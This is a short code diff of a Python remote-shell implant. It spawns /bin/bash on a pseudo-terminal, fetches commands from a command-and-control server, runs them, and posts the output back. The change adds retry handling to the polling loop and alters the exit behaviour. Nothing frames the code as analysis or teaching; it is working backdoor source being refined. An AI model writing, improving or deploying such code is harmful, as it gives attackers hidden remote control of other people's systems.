@@ -14,21 +14,26 @@ def listen():
         if pid == 0:
             os.execv("/bin/bash", ["/bin/bash"])  
         else:
-            while True:
-     
-                json_data = s.get(C2).json()
-                cmd = json_data.get("cmd")
+            attempt = 0
+            while attempt < 5:     
+                try:
+                    json_data = s.get(C2).json()
+                    cmd = json_data.get("cmd")
+                except:
+                    attempt += 1
+                    time.sleep(5)
+                    continue
                 if cmd: 
                     os.write(master_fd, (cmd + '\n').encode())
                 rlist, _, _ = select.select([master_fd], [], [], 1)
                 if rlist:
                     data = os.read(master_fd, 1024).decode()
                     s.post(C2, json={"output": data})
-                time.sleep(0.1)
+                time.sleep(0.1)   
 
 if __name__ == '__main__':
     while True:
         try:
             listen()
-        except:
-            time.sleep(5)
+        except Exception as e:
+            exit(1)
